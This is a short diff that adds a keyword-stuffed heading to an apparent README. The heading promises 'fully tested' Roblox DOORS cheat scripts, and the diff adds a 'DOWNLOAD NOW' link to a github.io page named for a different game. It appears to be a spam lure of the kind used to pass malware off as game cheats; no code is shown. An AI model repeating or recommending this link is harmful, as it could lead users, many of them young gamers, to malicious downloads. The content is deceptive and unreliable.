@@ -1,10 +1,10 @@
-
+# how to install DOORS roblox scripts 2026. Our pro DOORS roblox scripts are fully tested and ready for use.
 
 
 
 ---
   
-  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW]( ) |
+  📦 **CLICK FOR DOWNLOAD NOW** | [DOWNLOAD NOW](https://steal-a-brainrot-ts06.github.io/.github/ ) |
  |---------------------|----------------------:|
 
 
